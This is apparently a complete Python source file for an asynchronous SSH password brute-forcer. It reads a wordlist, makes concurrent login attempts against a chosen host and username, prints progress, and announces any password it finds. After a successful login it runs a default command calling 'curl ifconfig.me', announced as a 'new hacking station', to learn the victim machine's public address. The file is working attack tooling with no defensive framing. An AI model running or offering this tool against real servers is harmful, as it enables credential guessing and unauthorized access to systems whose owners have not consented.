import sys
import time
import uvloop
import asyncio, asyncssh, aiofiles, aiocsv
from random import random
import functools
import os

reset: str = "\33[m"
pos = 2
_, cols = os.popen('stty size', 'r').read().split()
cols = int(cols)


class BruteForceSSH:
    uvloop.install()
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    
    def __init__(self, 
                    user: str, 
                    host: str, 
                    port: int, 
                    file: str,  
                    sem: int, 
                    asleep: float,
                ):
        self.host: str = host
        self.port: int = port
        self.file: str = file
        self.user: str = user
        self.sem: int = sem
        self.asleep: float = asleep
        
        # start to measure execution wall time
        self.start: float = time.perf_counter()
        
        # auxiliary variables to keep track of requests (made / not made)
        self.failed: int = 0
        self.checked: int = 0
        self.tot_password: int = 0
        
    def brute_res(self, password):
        if password:
            print(f"""        
                \33[1;32;1m
                PASSWORD FOUND !!!
                Username: {self.user}
                Password: {password}
                Host: {self.host}\t Port: {self.port}

                Total time: {time.strftime("%Hh %Mm %Ss", time.gmtime(time.perf_counter() - self.start))}
                {reset}
                """.replace(" ", "")
                )
            exit(0)
        else:
            print(f"""
                \33[1;31;1m
                PASSWORD NOT FOUND :(

                Total time: {time.strftime("%Hh %Mm %Ss", time.gmtime(time.perf_counter() - self.start))}
                {reset}
                """.replace(" ", "")
                )
            exit(-1)
            
    @functools.lru_cache()
    def print_stdout(self, *args):
        global pos
        stats = f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}     Elapsed: {time.strftime('%Hh %Mm %Ss', time.gmtime(time.perf_counter() - self.start))}"
        stats_col = len(stats)
        print(*args[1:], reset)
        print("\033[1;30;1m","-" * (cols - 1),"\033[0m", end="")
        sys.stdout.write("\033[0;0H")
        
        print(stats, " " * (cols - stats_col + 8), reset)
        sys.stdout.write(f"\033[{pos};0H")
        
        sys.stdout.flush()
        pos += 1
    # ================================ Async Functions ================================ #
        
    # ------------------------------ Perform SSH request to find out Password ------------------------------ #
    async def brute(self, password: str, sem, command: str = 'echo -n "Hello from ur new hacking station: "; curl ifconfig.me'):
        i = 0
        while 1:
            async with sem:
                try:
                    async with asyncssh.connect(self.host, username=self.user, password=password, port=self.port, known_hosts=None, keepalive_interval=100) as conn:
                        success = await conn.run(command)
                        self.print_stdout(self.tot_password, f"\33[38;5;208mattempt nr {i}", f"\33[1;32;1m[Password Found]\tUsername: {self.user}, Password: {password}")
                        self.print_stdout(self.tot_password, f"\33[1;32;1m{success.stdout}")
                        # termino gli altri thread e termina il programma
                        [task.cancel() for task in asyncio.all_tasks() if task is not asyncio.current_task()]
                        self.brute_res(password)
                except asyncssh.PermissionDenied as e:
                    self.print_stdout(self.tot_password, f"\33[38;5;208mattempt nr {i}", "\33[1;33;1m[Password Not Found]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                    self.checked += 1
                    return
                except asyncssh.ConnectionLost as e:
                    self.print_stdout(self.tot_password, f"\33[38;5;208mattempt nr {i}", "\33[1;34;1m[Connection Refused]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                except Exception as e:
                    self.print_stdout(self.tot_password, f"\33[38;5;208mattempt nr {i}", "\33[1;35;1m[Connection Reset]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                await asyncio.sleep(random() * self.asleep)
                i += 1

    # ------------------------------ Test all passwords in a file ------------------------------ #
    @functools.lru_cache()
    async def main(self):
        sem: asyncio.Semaphore = asyncio.Semaphore(self.sem)
        async with aiofiles.open(self.file, mode='r') as f:
            count = 0
            tasks = []
            async for line in aiocsv.AsyncReader(f):
                if count % 4096 == 0:
                    await asyncio.gather(*tasks)
                    tasks.clear()
                tasks.append(asyncio.create_task(self.brute(line[0], sem)))
                count += 1
                self.tot_password += 1
            await asyncio.gather(*tasks)
            self.brute_res(None)
            
    def run(self):
        try:
            asyncio.run(self.main())
        except asyncio.CancelledError:
            pass
        except KeyboardInterrupt:
            print("\33[1;31;1m\nAbort by user\33[m\n")
        except Exception as e:
            print(f"\nSomething happened\n: {e}")
            



